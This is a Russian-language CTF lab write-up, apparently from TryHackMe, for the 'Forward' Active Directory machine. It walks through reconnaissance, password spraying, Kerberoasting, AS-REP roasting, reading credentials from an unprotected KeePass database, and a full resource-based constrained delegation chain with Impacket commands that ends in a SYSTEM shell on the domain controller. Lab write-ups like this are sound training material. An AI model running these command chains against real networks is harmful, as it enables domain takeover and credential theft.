# Отчёт о прохождении машины Forward

## 1. Разведка (Reconnaissance)

Выполнено сканирование Nmap для выявления открытых портов и определения сервисов целевой системы.

```bash
nmap -sV -sC -p- 10.48.160.167
```

Результаты сканирования:

| Порт | Сервис | Назначение |
|------|--------|------------|
| 53/tcp | domain | DNS-сервер |
| 88/tcp | kerberos-sec | Kerberos KDC |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | NetBIOS Session Service |
| 389/tcp | ldap | Active Directory LDAP (Domain: ctf.local) |
| 445/tcp | microsoft-ds | SMB |
| 464/tcp | kpasswd5 | Kerberos password change |
| 593/tcp | ncacn_http | Windows RPC over HTTP |
| 636/tcp | tcpwrapped | LDAPS |
| 3268/tcp | ldap | LDAP Global Catalog |
| 3269/tcp | tcpwrapped | LDAPS Global Catalog |
| 3389/tcp | ms-wbt-server | RDP |

По наличию портов 88 (Kerberos), 389 (LDAP), 445 (SMB), 464 (kpasswd5) и 636 (LDAPS) идентифицирован Domain Controller домена `ctf.local`.

Добавлены записи в `/etc/hosts`:

```
10.48.160.167 dc01.ctf.local ctf.local
```


## 2. Проверка пользователя j.smith

Аутентификация с предоставленными учетными данными:

```bash
nxc smb 10.48.160.167 -u 'ctf.local\j.smith' -p 'JSmith@IT2024'
```

Результат:

```
SMB 10.48.160.167 445 DC01 [+] ctf.local\j.smith:JSmith@IT2024
```

Учетная запись валидна, но не является административной.

Попытка получить shell через `psexec` не увенчалась успехом т.к не local admin. Удалось подключиться по RDP.


## 3. Анализ прав пользователя j.smith

Выполнена команда `whoami /all` для определения прав и групп:

```
User Name: ctf\j.smith
SID: S-1-5-21-1966530601-3185510712-10604624-1609
```

**Группы:**
- Everyone
- BUILTIN\Remote Desktop Users
- BUILTIN\Users
- BUILTIN\Pre-Windows 2000 Compatible Access (Deny only)
- NT AUTHORITY\REMOTE INTERACTIVE LOGON
- NT AUTHORITY\INTERACTIVE
- NT AUTHORITY\Authenticated Users
- NT AUTHORITY\This Organization
- LOCAL
- Authentication authority asserted identity
- CTF\AppLocker-Restricted

**Привилегии:**
- SeMachineAccountPrivilege — Disabled
- SeChangeNotifyPrivilege — Enabled
- SeIncreaseWorkingSetPrivilege — Disabled

**Вывод:** `j.smith` — обычный пользователь без административных прав.


## 4. Перечисление пользователей домена

```cmd
net user /domain
```

Найдены следующие учетные записи:
- `Administrator`
- `j.smith`
- `krbtgt`
- `r.williams`


## 5. Проверка сессий

```cmd
quser
```

Активна только сессия `j.smith`. Дамп LSASS невозможен из-за отсутствия прав.


## 6. Подтверждение роли контроллера домена

```cmd
systeminfo
```

Вывод подтверждает, что хост `DC01` является Primary Domain Controller.


## 7. BloodHound — анализ графа

Выполнен сбор данных через `bloodhound-python` и `SharpHound`. После загрузки в BloodHound CE обнаружено:

- Прямых путей эскалации от `j.smith` к `Administrator` нет.
- `r.williams` состоит в кастомной группе **`sysadmin`**.
- BloodHound показал путь эскалации от `r.williams` до `Administrator` через:
  - `AllowedToAct`
  - `CoerceToTGT`


## 8. Password spraying

Проверка пароля `JSmith@IT2024` на других пользователях:

```bash
nxc smb 10.48.160.167 -u users.txt -p 'JSmith@IT2024' --continue-on-success
```

Результатов нет. Пароль уникален для `j.smith`.


## 9. Kerberoasting

Запрос TGS-билетов:

```bash
GetUserSPNs.py ctf.local/j.smith:'JSmith@IT2024'@10.48.160.167 -request
```

Получен TGS для сервисной учетной записи `svc.helpdesk`. Попытка взлома через Hashcat (режим 13100) не увенчалась успехом — пароль не найден в словарях.


## 10. AS-REP Roasting

```bash
GetNPUsers.py ctf.local/ -dc-ip 10.48.160.167 -usersfile users.txt -format hashcat
```

Результатов нет — ни у одного пользователя не отключена предварительная аутентификация.


## 11. Обнаружение KeePass

В процессе перечисления обнаружен процесс `keepass.exe` и файл базы данных `Database.kdbx` в `C:\Users\j.smith\Documents`. База скопирована на атакующую машину.

Попытки взлома:

- `keepass4brute` — безуспешно
- `keepass2john` + `john` / `hashcat -m 13400` — безуспешно
- KeePass 2.x, `Database.kdbx` — попытка открыть с пустым паролем успешна

Содержимое базы:

```
Michael321:12345
UserName:Password
t.jones:Helpdesk01!
```


## 12. Аутентификация как r.williams

Пароль `t.jones:Helpdesk01!` проверен на учетную запись `r.williams`:

```bash
nxc smb 10.48.160.167 -u 'r.williams' -p 'Helpdesk01!'
```

Результат:

```
SMB 10.48.160.167 445 DC01 [+] ctf.local\r.williams:Helpdesk01!
```

Успешная аутентификация. Выполнено подключение по RDP как `r.williams`.


## 13. Анализ прав r.williams

```cmd
whoami /all
```

**Группы:**
- Everyone
- BUILTIN\Remote Desktop Users
- BUILTIN\Users
- BUILTIN\Pre-Windows 2000 Compatible Access (Deny only)
- NT AUTHORITY\REMOTE INTERACTIVE LOGON
- NT AUTHORITY\INTERACTIVE
- NT AUTHORITY\Authenticated Users
- NT AUTHORITY\This Organization
- LOCAL
- Authentication authority asserted identity
- **CTF\sysadmin** (кастомная группа)

**Привилегии:**
- SeMachineAccountPrivilege — Disabled
- SeChangeNotifyPrivilege — Enabled
- SeIncreaseWorkingSetPrivilege — Disabled

Группа `sysadmin` дает права на добавление компьютеров в домен и настройку делегирования.


## 14. Эскалация привилегий через Resource-Based Constrained Delegation (RBCD)

### Шаг 1: Создание компьютерного аккаунта

```bash
addcomputer.py -method LDAP -computer-name 'FAKECOMP$' -computer-pass 'Summer2018!' -dc-host dc01.ctf.local -domain-netbios CTF 'ctf.local/r.williams:Helpdesk01!'
```

### Шаг 2: Настройка делегирования

```bash
rbcd.py -delegate-from 'FAKECOMP$' -delegate-to 'DC01$' -action 'write' 'ctf.local/r.williams:Helpdesk01!'
```

### Шаг 3: Получение TGT для созданного компьютера

```bash
getTGT.py ctf.local/FAKECOMP$:'Summer2018!' -dc-ip dc01.ctf.local
export KRB5CCNAME=FAKECOMP\$.ccache
```

### Шаг 4: Подделка билета для Administrator

```bash
getST.py -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' ctf.local/FAKECOMP$ -dc-ip dc01.ctf.local
export KRB5CCNAME=Administrator.ccache
```

### Шаг 5: Получение shell на DC

```bash
psexec.py -k -no-pass ctf.local/Administrator@dc01.ctf.local
```

**Успех!** Получен shell от имени `NT AUTHORITY\SYSTEM` на контроллере домена.


## 15. Флаг

В shell на DC найден флаг:

```cmd
C:\Users\Administrator\Desktop> type flag.txt
THM{...}
```

## 16. Итог

Цепочка атаки включала:

1. Начальный доступ через RDP с учетными данными `j.smith:JSmith@IT2024`
2. Перечисление пользователей домена, обнаружение `r.williams`
3. Обнаружение базы KeePass `Database.kdbx` в `C:\Users\j.smith\Documents`
4. Извлечение пароля `Helpdesk01!` (учетная запись `t.jones` в базе KeePass)
5. Аутентификация как `r.williams:Helpdesk01!`
6. Анализ BloodHound — путь эскалации через RBCD
7. Создание компьютерного аккаунта `FAKECOMP$`
8. Настройка Resource-Based Constrained Delegation с `FAKECOMP$` на `DC01$`
9. Подделка TGT и TGS для `Administrator`
10. Получение shell на DC и флага


## 17. Достижения и новые навыки

В ходе прохождения машины Forward были впервые применены следующие техники и инструменты:

**Resource-Based Constrained Delegation (RBCD)** — впервые использована атака на основе делегирования с созданием нового компьютерного аккаунта. Изучены механизмы `msDS-AllowedToActOnBehalfOfOtherIdentity`. Освоены инструменты `addcomputer.py`, `rbcd.py` для настройки делегирования.

**КeePass без пароля** — обнаружена база данных KeePass, которая открывалась без пароля. Внутри найдены учетные данные `t.jones:Helpdesk01!`, использованные для аутентификации как `r.williams`.

**BloodHound** — выявлен путь эскалации от `r.williams` к `Administrator` через `AllowedToAct` и `CoerceToTGT`. Понимание графа позволило выбрать правильную технику атаки (RBCD).

**Kerberoasting** — выполнен запрос TGS для сервисной учетной записи `svc.helpdesk`. Хэш не взломан, но отработана техника.

**AS-REP Roasting** — проверены пользователи на отключенную предварительную аутентификацию (без результатов).

**Password spraying** — проверка паролей на различных пользователях домена.

**RDP** — использован для подключения к DC с учетными записями `j.smith` и `r.williams`.